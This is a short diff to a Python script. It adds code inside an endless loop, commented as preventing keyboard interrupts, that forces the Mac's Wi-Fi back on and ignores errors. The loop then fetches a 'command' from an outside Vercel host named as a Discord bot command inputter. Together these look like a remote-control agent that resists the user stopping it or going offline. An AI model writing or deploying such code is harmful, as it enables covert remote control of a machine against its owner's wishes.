@@ -24,6 +24,10 @@ except KeyboardInterrupt:
 while True:
     # prevent keyboardinterrupt
     try:
+        ossystem("/usr/sbin/networksetup -setairportpower en0 on")
+    except:
+        continue
+    try:
         #get HTML
         try:
             command = get("https://discord-bot-command-inputter-littleblack111.vercel.app").content.decode()
